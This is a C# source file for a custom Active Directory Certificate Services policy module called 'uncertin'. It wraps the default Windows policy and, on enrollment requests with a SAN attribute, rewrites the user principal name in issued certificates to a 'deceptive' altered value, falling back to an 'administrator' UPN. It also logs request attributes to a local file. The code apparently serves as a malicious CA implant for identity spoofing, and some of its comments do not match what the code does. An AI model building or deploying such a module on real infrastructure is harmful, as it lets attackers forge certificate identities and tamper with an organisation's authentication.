using System;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.InteropServices;
using CERTCLILib;
using CERTPOLICYLib;
using System.IO;

namespace uncertin
{
    [ComVisible(true)]
    [ClassInterface(ClassInterfaceType.None)]
    [ProgId("uncertin.Policy")]
    [Guid("82C1BD8A-32DC-4B17-BAFD-5FA27719E5E4")]
    public class Policy : ICertPolicy2
    {
        private ICertPolicy2 windowsDefaultPolicyModule;

        // CertServ.h enums
        private const int VR_PENDING = 0;
        private const int VR_INSTANT_OK = 1;
        private const int PROPTYPE_STRING = 4;

        public Policy() { }

        public void Initialize(string strConfig)
        {
            windowsDefaultPolicyModule = (ICertPolicy2)Activator.CreateInstance(
                Type.GetTypeFromProgID("CertificateAuthority_MicrosoftDefault.Policy", true));
            windowsDefaultPolicyModule.Initialize(strConfig);
        }

        public int VerifyRequest(string strConfig, int Context, int bNewRequest, int Flags)
        {
            CCertServerPolicy serverPolicy = new CCertServerPolicy();
            serverPolicy.SetContext(Context);

            int rtn = windowsDefaultPolicyModule.VerifyRequest(strConfig, Context, bNewRequest, Flags);
            if (rtn == VR_PENDING || rtn == VR_INSTANT_OK)
            {
                IntPtr pVal = Marshal.AllocCoTaskMem(100);
                try
                {
                    serverPolicy.GetRequestProperty("RequestAttributes", PROPTYPE_STRING, pVal);
                    string requestAttributes = Marshal.GetObjectForNativeVariant(pVal) as string ?? "";
                    StreamWriter sw = new StreamWriter("C:\\uncertin\\log.txt");
                    sw.Write(requestAttributes);
                    sw.Flush();
                    sw.Close();

                    if (requestAttributes.Contains("Enrollment") && requestAttributes.Contains("SAN"))
                    {
                        // Get the original UPN from the request
                        string originalUpn = GetUpnFromRequest(serverPolicy);

                        // Append a zero-width space
                        string deceptiveUpn = originalUpn.Replace("@", "@na.");

                        SubjectAlternativeNameBuilder san = new SubjectAlternativeNameBuilder();
                        san.AddUserPrincipalName(deceptiveUpn);
                        X509Extension sanExtension = san.Build();
                        byte[] sanBytes = sanExtension.RawData;

                        // Use the extension helper (from TameMyCerts)
                        serverPolicy.SetCertificateExtension("2.5.29.17", sanBytes, false);
                    }
                }
                finally
                {
                    Marshal.FreeCoTaskMem(pVal);
                }
            }
            return rtn;
        }

        // Helper to extract UPN from request SAN
        private string GetUpnFromRequest(CCertServerPolicy serverPolicy)
        {
            try
            {
                object sanRaw = serverPolicy.GetRequestAttribute("SAN");
                if (sanRaw is string sanString)
                {
                    // The SAN attribute may contain multiple values, e.g.: "upn=foo@bar, email=foo@bar"
                    var parts = sanString.Split(',');
                    foreach (var part in parts)
                    {
                        var trimmed = part.Trim();
                        if (trimmed.StartsWith("upn=", StringComparison.OrdinalIgnoreCase))
                        {
                            return trimmed.Substring(4).Trim();
                        }
                    }
                }
            }
            catch { }
            // Fallback: return a default UPN (or throw)
            return "administrator@.poi.local";
        }

        public string GetDescription() => "uncertin";

        public void ShutDown()
        {
            windowsDefaultPolicyModule.ShutDown();
            Marshal.ReleaseComObject(windowsDefaultPolicyModule);
        }

        public CCertManagePolicyModule GetManageModule() => new PolicyManage();
    }
}